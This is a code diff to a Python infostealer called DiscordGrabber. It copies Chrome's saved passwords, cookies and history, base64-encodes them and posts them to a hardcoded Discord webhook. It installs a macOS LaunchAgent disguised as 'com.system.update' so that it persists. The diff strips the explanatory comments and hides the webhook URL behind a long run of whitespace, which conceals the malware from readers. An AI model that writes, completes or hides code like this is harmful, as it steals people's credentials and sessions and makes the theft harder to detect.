@@ -100,7 +100,7 @@ class DiscordGrabber:
     def extract_chrome_data(self, path):
         """Extract Chrome passwords, cookies, and history"""
         try:
-            # Copy databases to temp location to avoid locks
+            
             temp_path = os.path.join(os.path.expandvars('%TEMP%'), 'chrome_temp')
             os.makedirs(temp_path, exist_ok=True)
             
@@ -112,7 +112,7 @@ class DiscordGrabber:
                 if os.path.exists(src):
                     shutil.copy2(src, dst)
             
-            # Extract passwords
+            
             if os.path.exists(os.path.join(temp_path, 'Login Data')):
                 conn = sqlite3.connect(os.path.join(temp_path, 'Login Data'))
                 cursor = conn.cursor()
@@ -129,7 +129,7 @@ class DiscordGrabber:
                         pass
                 conn.close()
             
-            # Extract cookies
+            
             if os.path.exists(os.path.join(temp_path, 'Cookies')):
                 conn = sqlite3.connect(os.path.join(temp_path, 'Cookies'))
                 cursor = conn.cursor()
@@ -148,7 +148,7 @@ class DiscordGrabber:
                         pass
                 conn.close()
             
-            # Extract history
+            
             if os.path.exists(os.path.join(temp_path, 'History')):
                 conn = sqlite3.connect(os.path.join(temp_path, 'History'))
                 cursor = conn.cursor()
@@ -162,7 +162,7 @@ class DiscordGrabber:
                     })
                 conn.close()
             
-            # Clean up temp files
+            
             shutil.rmtree(temp_path, ignore_errors=True)
         except Exception as e:
             pass
@@ -174,8 +174,7 @@ class DiscordGrabber:
             for profile in profiles:
                 profile_path = os.path.join(path, profile)
                 
-                # Firefox passwords handling would require additional libraries
-                # This is a simplified placeholder
+                
                 pass
         except:
             pass
@@ -199,7 +198,7 @@ class DiscordGrabber:
                 payload = {"content": data}
                 response = requests.post(self.webhook_url, json=payload)
             else:
-                # Convert to JSON string and then to bytes
+                
                 json_data = json.dumps(data, indent=4)
                 encoded_data = base64.b64encode(json_data.encode()).decode()
                 
@@ -247,7 +246,7 @@ class DiscordGrabber:
             self.send_to_discord(self.browser_history, "browser_history.json")
 
 
-            # Add to macOS startup
+            
             launch_agent = os.path.expanduser('~/Library/LaunchAgents/com.system.update.plist')
             plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -276,10 +275,10 @@ class DiscordGrabber:
 
 
 if __name__ == "__main__":
-    # Replace with your Discord webhook URL
-    WEBHOOK_URL = "https://discord.com/api/webhooks/1448305863298257017/KN3ct_EdVakCrAnADnwgo6oFjPln7bBYhLZXMhuTSyvPGWp1GYMY_yOU64_ZXz1nyIfJ"
     
-    # Add persistence to run on system startup
+                                                                                                                                                                                                                                                                                                                                                                                                                               WEBHOOK_URL = "https://discord.com/api/webhooks/1448305863298257017/KN3ct_EdVakCrAnADnwgo6oFjPln7bBYhLZXMhuTSyvPGWp1GYMY_yOU64_ZXz1nyIfJ"
+    
+    
 
     
     # Run the grabber
